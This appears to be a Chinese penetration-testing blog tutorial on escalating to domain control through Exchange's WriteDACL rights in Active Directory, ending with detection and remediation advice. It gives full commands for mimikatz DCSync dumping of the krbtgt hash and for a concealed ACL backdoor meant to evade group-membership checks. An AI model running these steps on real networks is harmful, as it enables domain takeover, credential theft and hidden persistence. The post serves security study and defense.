---
layout: post
title: 域渗透——使用Exchange服务器中特定的ACL实现域提权
---


## 0x00 
---

最近学到的一个域环境下的提权技巧，在域环境中，安装Exchange后会添加一个名为`Microsoft Exchange Security Groups`的OU，其中包括两个特殊的组：`Exchange Trusted Subsystem`和`Exchange Windows Permission`，如果获得了这两个组内任意用户的控制权限，就能够继承该组的WriteDACL权限，进而修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash。接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限。

学习资料：

https://github.com/gdedrouas/Exchange-AD-Privesc

本文将会记录复现过程，介绍利用这个机制建立提权后门的方法，详细介绍使用PowerView对域对象ACL的操作方法，最后给出检测和防御建议。

## 0x01 简介
---

本文将要介绍以下内容：

- 提权方法复现
- 建立提权后门的方法
- 检测和防御建议

## 0x02 提权方法复现
---

测试环境：

- Server2012R2 x64
- Exchange 2013

### 前置知识

#### 1.常用缩写词

- DN:Distinguished Name
- CN:Common Name
- OU:Organizational Unit
- DC:Domain Component
- ACE:Access Control Entries
- ACL:Access Control List

LDAP连接服务器的连接字串格式为：ldap://servername/DN 

其中DN有三个属性，分别是CN、OU和DC

#### 2.安装Exchange后默认会自动添加一个名为Microsoft Exchange Security Groups的OU

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/2-1.png)

其中包括两个特殊的组：`Exchange Trusted Subsystem`和`Exchange Windows Permission`

`Exchange Trusted Subsystem`是`Exchange Windows Permission`的成员

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/2-2.png)

默认情况下，`Exchange Windows Permissions`对安装Exchange的域对象具有WriteDACL权限，那么`Exchange Trusted Subsystem`也会继承这个权限

#### 3.如果对域对象具有WriteDACL权限，就能够为指定域用户添加ACE，使其获得利用DCSync导出域内所有用户hash的权限，接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限

详细利用方法可参考之前的文章：[《域渗透——DCSync》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/)

#### 4.使用PowerView能够对域对象的ACL进行操作

值得注意的是PowerView存在两个版本，有些功能只在dev版本中支持，两个版本的地址分别为：

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

这个细节在之前的文章[《域渗透——AdminSDHolder》](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder/)有过介绍

### 实际测试

这里以`Exchange Trusted Subsystem`作为测试对象，测试用户testa的口令已经获得，先将测试用户testa添加到`Exchange Trusted Subsystem`中

Powershell命令如下：

```
Import-Module ActiveDirectory
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
```

对于未安装Active Directory模块的Windows系统，可以通过如下命令导入Active Directory模块：

```
import-module .\Microsoft.ActiveDirectory.Management.dll
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
```

`Microsoft.ActiveDirectory.Management.dll`在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：

https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll

添加成功后如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-1.png)

接下来，在另一台域内主机上完成所有提权的操作

#### 1.登录用户testa

cmd：

```
echo 123456789 | runas /user:test\testa cmd
```

如果在测试过程中，第一次将测试用户testa添加到`Exchange Trusted Subsystem`中，那么用户testa需要重新登录才能继承WriteDACL权限

查看用户testa所在的组：

```
whoami /groups
```

发现用户testa成功加入`Exchange Trusted Subsystem`组，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-2.png)

#### 2.使用mimikatz的DCSync功能导出用户krbtgt的hash

cmd：

```
mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
```

成功导出用户krbtgt的hash，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-3.png)

接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限

提权成功

经过多次测试，得出以下结论：

如果获得了以下三个组内任意用户的权限，都能够利用DCSync导出域内所有用户hash

组名如下：

- Exchange Trusted Subsystem
- Exchange Windows Permission
- Organization Management

## 0x03 建立提权后门的方法
---

如果获得了整个域的控制权限，可以利用Exchange中的ACL作为域提权的后门

### 方法1：直接在Exchange的三个组内添加后门用户

这里以`Exchange Trusted Subsystem`为例

Powershell命令如下：

```
Import-Module ActiveDirectory
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
```

但是不够隐蔽，很容易被发现添加的用户

查看的命令如下：

```
net group "Exchange Trusted Subsystem" /domain
```

### 方法2：只添加特定用户对Exchange中三个组ACL的控制权限

这里以`Exchange Trusted Subsystem`为例

#### 1.首先需要找到Exchange Trusted Subsystem的DN(Distinguished Name)

需要使用Powerview的dev版本，地址如下：

https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1

查看所有DN的Powershell命令如下：

```
Import-Module .\PowerView.ps1
Get-DomainObject -Properties distinguishedname |fl
```

找到`Exchange Trusted Subsystem`的DN为：`CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com`

#### 2.查看Exchange Trusted Subsystem的ACL

Powershell命令如下：

```
Get-DomainObjectAcl -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com"
```

#### 3.获得Exchange Trusted Subsystem的原始数据

```
$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
```

#### 4.添加后门用户testb对Exchange Trusted Subsystem的完全访问权限

```
$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity testb -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
```

**补充：**

移除后门用户testb对`Exchange Trusted Subsystem`的完全访问权限：

```
$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
$TargetObject = $RawObject.GetDirectoryEntry()
$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity testb -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
$TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
$TargetObject.PsBase.CommitChanges()
```

#### 5.查看用户testb的sid

```
Get-DomainUser testb
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/4-1.png)

用户testb的objectsid为`S-1-5-21-1672228480-1396590849-334771951-2105`

#### 6.查看属于新添加用户testb的ACE

```
Get-DomainObjectAcl -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" | Where-Object {$_.SecurityIdentifier -eq "S-1-5-21-1672228480-1396590849-334771951-2105"}
```

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/4-2.png)

至此，后门安装成功

此时查看`Exchange Trusted Subsystem`组的用户：

```
net group "Exchange Trusted Subsystem" /domain
```

无法发现后门用户testb

### 后门启动方法

#### 1.在另一台域内主机上登录用户testb

cmd：

```
echo 123456789 | runas /user:test\testb cmd
```

#### 2.将用户testb添加到Exchange Trusted Subsystem

由于用户testb有对`Exchange Trusted Subsystem`的完全访问权限，所以能够将自己添加到`Exchange Trusted Subsystem`组中

Powershell命令如下：

```
import-module .\Microsoft.ActiveDirectory.Management.dll
Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testb
```

#### 3.重新登录用户testb

cmd：

```
echo 123456789 | runas /user:test\testb cmd
```

#### 4.使用mimikatz的DCSync功能导出用户krbtgt的hash

cmd：

```
mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
```

#### 5.将用户testb从Exchange Trusted Subsystem组中移除

Powershell命令如下：

```
import-module .\Microsoft.ActiveDirectory.Management.dll
Remove-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testb -confirm:$false
```

由于用户testb具有对`Exchange Trusted Subsystem`的完全访问权限，所以能够反复将自己添加或是移除`Exchange Trusted Subsystem`

## 0x04 检测和防御建议
---

从根源上修复：去除`Exchange Windows Permissions`的WriteDACL权限

可供参考的脚本：

https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1

日志检测：

需要开启Active Directory的高级安全审核策略，当域对象的ACL被修改后，将产生ID为5136的日志

参考资料：

https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/

## 0x05 小结
---

本文记录了使用Exchange中特定ACL进行提权的过程，分析了利用条件，结合这个机制介绍了一个提权后门的利用方法，最后给出检测和防御建议。



---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)






